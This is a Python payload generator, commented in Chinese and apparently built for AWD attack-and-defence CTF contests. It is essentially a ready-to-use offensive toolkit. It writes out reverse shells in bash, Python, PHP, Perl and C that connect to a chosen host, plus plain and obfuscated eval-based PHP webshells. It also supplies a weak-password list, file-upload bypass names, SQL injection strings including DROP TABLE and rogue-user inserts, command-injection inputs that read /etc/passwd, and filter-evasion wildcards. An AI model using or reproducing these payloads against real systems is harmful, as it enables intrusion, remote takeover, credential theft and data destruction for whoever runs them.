#!/usr/bin/env python3
"""
AWD Payload 生成器 - 常用攻击载荷
"""

import base64
import random
import string
import sys


# ========== 反弹 Shell Payloads ==========

def bash_reverse_shell(ip, port):
    """Bash 反弹 Shell"""
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def python_reverse_shell(ip, port):
    """Python 反弹 Shell"""
    return f"""python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""


def php_reverse_shell(ip, port):
    """PHP 反弹 Shell"""
    return f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""


def perl_reverse_shell(ip, port):
    """Perl 反弹 Shell"""
    return f"""perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""


# ========== Webshell Payloads ==========

def php_webshell(password='awd'):
    """PHP WebShell"""
    import hashlib
    pwd_md5 = hashlib.md5(password.encode()).hexdigest()
    return f"""<?php
// AWD WebShell - 请修改密码!
if(isset($_POST['cmd']) && md5($_POST['pwd']) === '{pwd_md5}'){{
    system($_POST['cmd']);
}}
// 可选: 文件上传
if(isset($_FILES['file'])){{
    move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name']);
}}
?>"""


def php_webshell_b64(password='awd'):
    """加密版 PHP WebShell"""
    code = f'''<?php
$key = "{password}";
$post = file_get_contents("php://input");
$data = unserialize(gzinflate(base64_decode($post)));
if($data["key"] === $key){{
    eval($data["cmd"]);
}}
?>'''
    return code


# ========== 提权 Payloads ==========

def linux_x64_reverse_tcp(ip, port):
    """Linux x64 反弹 TCP Shell (C 代码)"""
    return f'''#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {{
    int sockfd;
    struct sockaddr_in serv_addr;
    char *shell[] = {{"/bin/sh", "-i", NULL}};

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons({port});
    serv_addr.sin_addr.s_addr = inet_addr("{ip}");

    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve(shell[0], shell, NULL);
    return 0;
}}'''


# ========== 密码破解 Payloads ==========

def brute_force_payloads():
    """常用弱密码字典"""
    passwords = [
        'root', 'toor', 'admin', 'admin123', 'password',
        'root123', 'test', 'guest', '123456', 'qwerty',
        'abc123', '123456789', 'letmein', 'changeme',
        'awd', 'awd123', 'ctf', 'ctf123', 'hack',
        'P@ssw0rd', 'Passw0rd', 'Pass123', 'root@123',
    ]
    return passwords


# ========== 文件上传攻击 Payloads ==========

def file_upload_payloads():
    """文件上传绕过 Payloads"""
    return [
        # 双写绕过
        'shell.php%00.jpg',
        'shell.php .',
        'shell.php.',
        '.htaccess',
        # MIME 类型绕过
        ('shell.php', 'image/jpeg'),
        ('shell.php', 'image/png'),
        # 特殊后缀
        'shell.phtml',
        'shell.pht',
        'shell.php5',
        'shell.php7',
        'shell.phps',
    ]


# ========== SQL 注入 Payloads ==========

def sqli_payloads():
    """SQL 注入常用 Payloads"""
    return [
        "' OR '1'='1",
        "' OR '1'='1' -- -",
        "' OR 1=1 -- -",
        "' OR ''='",
        "admin'--",
        "' UNION SELECT 1,2,3,4,5 -- -",
        "' UNION SELECT user(),2,3,4,5 -- -",
        "' AND 1=1 -- -",
        "' AND 1=2 -- -",
        "1' AND SLEEP(5)--",
        "' AND IF(1=1,SLEEP(5),0)--",
        # 堆叠查询
        "'; DROP TABLE users; -- -",
        "'; INSERT INTO users VALUES('hacker','hacker'); -- -",
    ]


# ========== 命令执行 Payloads ==========

def command_injection_payloads():
    """命令注入 Payloads"""
    return [
        '; id',
        '| id',
        '|| id',
        '$(id)',
        '`id`',
        '; cat /etc/passwd',
        '; ls -la',
        '; uname -a',
        # 盲注
        '; sleep 3',
        '; ping -c 3 127.0.0.1',
        # 绕过过滤
        '; /bin/??d',
        '; /???/??t /???/p???d',
    ]


# ========== 随机生成文件名 (绕过检测) ==========

def random_filename(prefix='shell', suffix='.php'):
    """生成随机文件名"""
    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{rand}{suffix}"


# ========== 编码 Payloads ==========

def encode_payload(payload, method='base64'):
    """编码 Payload"""
    if method == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif method == 'hex':
        return payload.encode().hex()
    elif method == 'url':
        from urllib.parse import quote
        return quote(payload)
    return payload


def obfuscate_shell_command(cmd):
    """混淆命令 (绕过关键字过滤)"""
    replacements = {
        '/bin/sh': '/???/??h',
        '/bin/bash': '/???/b??h',
        'cat': 'c??t',
        'id': 'i?',
        'ls': 'l?',
        '/etc/passwd': '/??c/pa??wd',
        'root': 'r???t',
    }
    for original, obfuscated in replacements.items():
        cmd = cmd.replace(original, obfuscated)
    return cmd


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法: python3 payload_generator.py <type> [ip] [port]")
        print("  Types: reverse_shell, webshell, sqli, cmd_injection, brute_force")
        sys.exit(1)

    payload_type = sys.argv[1]
    ip = sys.argv[2] if len(sys.argv) > 2 else '127.0.0.1'
    port = sys.argv[3] if len(sys.argv) > 3 else '4444'

    generators = {
        'reverse_shell': lambda: {
            'bash': bash_reverse_shell(ip, port),
            'python': python_reverse_shell(ip, port),
            'php': php_reverse_shell(ip, port),
            'perl': perl_reverse_shell(ip, port),
        },
        'webshell': lambda: {
            'php': php_webshell('awd'),
        },
        'sqli': lambda: sqli_payloads(),
        'cmd_injection': lambda: command_injection_payloads(),
        'brute_force': lambda: brute_force_payloads(),
    }

    if payload_type in generators:
        result = generators[payload_type]()
        if isinstance(result, dict):
            for k, v in result.items():
                print(f"[{k}]: {v}")
        else:
            for i, p in enumerate(result, 1):
                print(f"[{i}]: {p}")
    else:
        print(f"未知类型: {payload_type}")
